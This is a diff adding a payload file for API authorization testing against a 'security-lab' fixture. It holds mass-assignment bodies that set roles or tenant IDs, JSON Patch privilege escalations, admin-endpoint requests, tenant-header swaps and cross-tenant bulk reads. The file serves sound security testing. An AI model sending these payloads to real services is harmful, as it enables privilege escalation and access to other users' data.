@@ -1,0 +1,53 @@
+# API Authorization Payloads
+# JSON lines are body replacements; request lines, query fragments and headers are independent cases.
+
+# Mass assignment: add one protected property to a known-good ordinary profile update
+{"displayName":"api-role-marker","role":"administrator"}
+{"displayName":"api-staff-marker","isStaff":true}
+{"displayName":"api-verified-marker","emailVerified":true}
+{"displayName":"api-owner-marker","ownerId":"api-user-b"}
+{"displayName":"api-tenant-marker","tenantId":"api-tenant-b"}
+{"profile":{"displayName":"api-nested-marker","permissions":["manage_users"]}}
+{"settings":{"displayName":"api-settings-marker","billingAdmin":true}}
+
+# JSON Patch / Merge Patch fixtures: use the content type actually supported by the endpoint
+# Content-Type: application/json-patch+json
+[{"op":"replace","path":"/role","value":"administrator"}]
+[{"op":"add","path":"/permissions/-","value":"manage_users"}]
+# Content-Type: application/merge-patch+json
+{"profile":{"tenantId":"api-tenant-b","displayName":"api-merge-marker"}}
+
+# Restricted property reads; compare low-privilege response with the documented field policy
+GET /api/security-lab/users/api-user-b?fields=id,email,internalNotes HTTP/1.1
+GET /api/security-lab/users/me?include=permissions,billingDetails HTTP/1.1
+GET /api/security-lab/projects/api-project-a?expand=owner,tenant HTTP/1.1
+
+# Privileged functions: invoke with a normal test account, then the administrator control
+GET /api/security-lab/admin/audit-summary HTTP/1.1
+GET /api/security-lab/admin/users?limit=2 HTTP/1.1
+POST /api/security-lab/admin/users/api-user-b/roles HTTP/1.1
+
+X-Tenant-ID: api-tenant-b
+X-Organization-ID: api-organization-b
+tenantId=api-tenant-b&limit=2
+organization_id=api-organization-b&includePrivate=true
+GET /api/security-lab/tenants/api-tenant-b/documents?limit=2 HTTP/1.1
+
+# Mixed-ownership bulk reads/writes; every item requires authorization
+{"documentIds":["api-doc-a","api-doc-b"],"operation":"readTitles"}
+{"updates":[{"id":"api-doc-a","title":"api-bulk-own"},{"id":"api-doc-b","title":"api-bulk-other"}]}
+{"tenantId":"api-tenant-a","items":[{"id":"api-doc-b","tenantId":"api-tenant-b"}]}
+
+# Method and version consistency; only use routes present in the fixture
+PATCH /api/security-lab/v2/users/me HTTP/1.1
+PUT /api/security-lab/v2/users/me HTTP/1.1
+POST /api/security-lab/v1/users/me/update HTTP/1.1
+
+# Body / path identity mismatch
+{"id":"api-user-b","displayName":"api-path-body-marker"}
+{"resource":{"id":"api-doc-b","ownerId":"api-user-a","title":"api-owner-rebind-marker"}}
+
+{"action":"readAuditSummary","authorization":{"role":"admin","approved":true}}
+{"operation":"listPrivateDocuments","context":{"tenant":"api-tenant-b","user":"api-user-b"}}
+
+# Check alternate export/download APIs against the same boundary without collecting real user data.
